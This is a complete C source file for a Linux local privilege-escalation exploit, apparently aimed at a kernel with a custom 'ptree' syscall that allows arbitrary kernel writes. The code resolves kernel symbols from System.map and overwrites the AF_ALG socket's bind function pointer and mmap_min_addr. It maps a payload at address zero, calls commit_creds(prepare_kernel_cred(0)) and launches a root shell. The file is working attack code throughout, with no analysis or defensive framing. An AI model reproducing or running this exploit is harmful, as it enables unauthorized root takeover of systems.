#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stddef.h>
#include <unistd.h>

#include <sys/syscall.h>
#include <sys/utsname.h>
#include <sys/mman.h>
#include <sys/socket.h>

#include <linux/if_alg.h>
#include <linux/net.h>
#include <linux/kernel.h>

#define __NR_ptree  313
#define PAGE_SIZE   0x1000

static unsigned long alg_proto_ops, alg_bind, sock_no_connect;

/* partial proto_ops structure as we don't need all of it */
struct proto_ops {
	int		family;
	struct module	*owner;
	int		(*release)   (struct socket *sock);
	int		(*bind)	     (struct socket *sock,
				      struct sockaddr *myaddr,
				      int sockaddr_len);
	int		(*connect)   (struct socket *sock,
				      struct sockaddr *vaddr,
				      int sockaddr_len, int flags);
	int		(*socketpair)(struct socket *sock1,
				      struct socket *sock2);
	int		(*accept)    (struct socket *sock,
				      struct socket *newsock, int flags);
	int		(*getname)   (struct socket *sock,
				      struct sockaddr *addr,
				      int *sockaddr_len, int peer);
};

struct prinfo {
    long state;
    pid_t pid;
    pid_t parent_pid;
    pid_t first_child_pid;
    pid_t next_sibling_pid;
    long uid;
    char comm[64];
};

static inline int ptree (struct prinfo *processes, unsigned int *count)
{
    return syscall(__NR_ptree, processes, count);
}

/* == START of Dan Rosenberg's code */
unsigned long try_sysmap (char *name, char *path)
{
    FILE *fp;
    unsigned long addr;
    char dummy, sname[512];
    int ret = 0, oldstyle = 0;
    struct utsname ver;

    fp = fopen(path, "r");
    if (!fp) {
        fprintf(stderr, "error: Failed opening file\n");
        return 0;
    }

    uname(&ver);
    if (strncmp(ver.release, "2.6", 3) < 0) {
        oldstyle = 1;
    }

    while (ret != EOF) {
        if (!oldstyle) {
            ret = fscanf(fp, "%p %c %s\n", (void **) &addr, &dummy, sname);
        } else {
            ret = fscanf(fp, "%p %s\n", (void **) &addr, sname);
            if (ret == 2) {
                char *p;
                if (strstr(sname, "_O/") || strstr(sname, "_S.")) {
                    continue;
                }
                p = strrchr(sname, '_');
                if (p > ((char *) sname + 5) && !strncmp(p - 3, "smp", 3)) {
                    p = p - 4;
                    while (p > (char *) sname && *(p - 1) == '_') {
                        p--;
                    }
                    *p = '\0';
                }
            }
        }
        if (ret == 0) {
            fscanf(fp, "%s\n", sname);
            continue;
        }
        if (!strcmp(name, sname)) {
            fclose(fp);
            return addr;
        }
    }

    fclose(fp);
    return 0;
}

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

static int __attribute__((regparm(3))) get_root (int sockfd,  const struct sockaddr *addr, socklen_t addrlen)
{
    commit_creds(prepare_kernel_cred(0));

    return -1;
}

/* Why do I do this?  Because on x86-64, the address of
 * commit_creds and prepare_kernel_cred are loaded relative
 * to rip, which means I can't just copy the above payload
 * into my landing area. */
void __attribute__((regparm(3))) trampoline()
{
#ifdef __x86_64__
    asm("mov $kernel_payload, %rax; call *%rax;");
#else
    asm("mov $kernel_payload, %eax; call *%eax;");
#endif
}
/* == END of Dan Rosenberg's code */

static int __attribute__((regparm(3))) fix_ptr (void)
{
    *((unsigned long *) (alg_proto_ops + offsetof(struct proto_ops, bind))) = alg_bind;
    *((unsigned long *) (alg_proto_ops + offsetof(struct proto_ops, connect))) = sock_no_connect;

    return -1;
}

static int __attribute__((regparm(3))) kernel_payload (int sockfd,  const struct sockaddr *addr, socklen_t addrlen)
{
    get_root(sockfd, addr, addrlen);
    fix_ptr();
}

int main (int argc, char *argv[])
{
    int sockfd;
    char system_map[1024];
    char *payload;
    void *landing;
    struct utsname ver;
    struct sockaddr_alg addr =  {
        .salg_family = AF_ALG,
        .salg_type = "skcipher",
        .salg_name = "cbc(aes)"
    };;
    unsigned long mmap_min_addr;

    /* resolve System.map path */
    uname(&ver);
    printf("[*] Got system uname\n");
    printf("    %s %s %s %s %s\n", ver.sysname, ver.nodename, ver.release, ver.version, ver.machine);

    snprintf(system_map, 1024, "/boot/System.map-%s", ver.release);
    printf("[*] Got system map path\n");
    printf("    %s\n", system_map);

    /* resolve kernel symbols */
    commit_creds = (_commit_creds) try_sysmap ("commit_creds", system_map);
    prepare_kernel_cred = (_prepare_kernel_cred) try_sysmap ("prepare_kernel_cred", system_map);
    alg_proto_ops = try_sysmap ("alg_proto_ops", system_map);
    alg_bind = try_sysmap ("alg_bind", system_map);
    sock_no_connect = try_sysmap ("sock_no_connect", system_map);
    mmap_min_addr = try_sysmap ("mmap_min_addr", system_map);

    if(!commit_creds || !prepare_kernel_cred) {
        printf("[*] Failed to resolve kernel symbols.\n");
        return -1;
    }

    printf("[*] Resolved kernel symbols\n");
    printf("    %p commit_creds\n", commit_creds);
    printf("    %p prepare_kernel_cred\n", prepare_kernel_cred);
    printf("    %p alg_proto_ops\n", (void *) alg_proto_ops);
    printf("    %p alg_bind\n", (void *) alg_bind);
    printf("    %p sock_no_connect\n", (void *) sock_no_connect);
    printf("    %p mmap_min_addr\n", (void *) mmap_min_addr);

    printf("[*] Patching fcnptr\n");

    ptree(NULL, alg_proto_ops + offsetof(struct proto_ops, bind));
    ptree(NULL, alg_proto_ops + offsetof(struct proto_ops, bind) + 4);

    printf("[*] Patching mmap_min_addr\n");

    ptree(NULL, mmap_min_addr);
    ptree(NULL, mmap_min_addr+4);

    printf("[*] mmaping payload memory\n");

    landing = NULL;
    printf("    Landing zone: %p\n", landing);
    payload = mmap(landing, 2 * PAGE_SIZE,
            PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0);
    if ((long)payload == -1) {
        printf("[*] Failed to mmap() at target address.\n");
        return -1;
    }
    memset(landing, '\x90', 2*PAGE_SIZE);
    memcpy(landing + PAGE_SIZE, &trampoline, 64);

    printf("[*] Triggering payload: get_root() + fix_ptr()\n");

    if ((sockfd = socket(AF_ALG, SOCK_SEQPACKET, 0)) == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    bind(sockfd, (struct sockaddr *) &addr, sizeof(addr));

    /* at this point we should get root */

    if (getuid()) {
        printf("[*] Exploit failed to get root.\n");
        return -1;
    }

    printf("[*] Got root!\n");

    execl("/bin/sh", "/bin/sh", NULL);

    return 0;
}

